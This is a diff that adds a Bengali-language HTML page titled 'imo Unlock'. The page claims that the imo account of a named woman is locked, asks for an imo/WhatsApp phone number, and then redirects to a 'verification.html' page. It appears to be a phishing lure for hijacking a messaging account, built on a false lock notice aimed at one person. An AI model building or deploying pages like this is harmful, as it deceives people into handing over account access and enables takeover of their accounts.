@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>imo Unlock</title>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css"/>
+
+<style>
+body{
+  font-family:Arial;
+  background:#f4f6f8;
+  margin:0;
+  padding:0;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.container{
+  background:white;
+  width:360px;
+  border-radius:16px;
+  box-shadow:0 8px 20px rgba(0,0,0,0.1);
+  padding:20px;
+  text-align:center;
+}
+
+h2{
+  margin-bottom:10px;
+}
+
+p{
+  font-size:14px;
+  color:#555;
+}
+
+#phone{
+  width:100%;
+  padding:12px;
+  border:1px solid #ddd;
+  border-radius:10px;
+  margin-top:15px;
+}
+
+button{
+  margin-top:20px;
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:#cfcfcf;
+  color:white;
+  font-size:16px;
+  cursor:not-allowed;
+  transition:all 0.3s ease;
+}
+
+button.active{
+  background:#1e88ff;
+  cursor:pointer;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<h2>Mst:Sarmin akter</h2>
+<p>Mst:Sarmin akter এর imo অ্যাকাউন্ট লক। নিচে ফাঁকা ঘরে imo/WhatsApp নাম্বার বসান।</p>
+
+<input id="phone" type="tel" placeholder="নিচে নাম্বার বসান">
+
+<button id="unlockBtn">Sarmin akter আনলক করুন →</button>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
+<script>
+const input = document.querySelector("#phone");
+const btn = document.getElementById("unlockBtn");
+
+// intl-tel-input setup
+window.intlTelInput(input, {
+  initialCountry: "auto",
+  geoIpLookup: function(callback){
+    fetch("https://ipapi.co/json").then(res=>res.json()).then(data=>callback(data.country_code)).catch(()=>callback("bd"));
+  },
+  separateDialCode: true
+});
+
+// Enable button when user types
+input.addEventListener("input", function(){
+  if(input.value.length>=6){
+    btn.classList.add("active");
+    btn.onclick = ()=>window.location.href="verification.html";
+  }else{
+    btn.classList.remove("active");
+    btn.onclick = null;
+  }
+});
+</script>
+</body>
+</html>
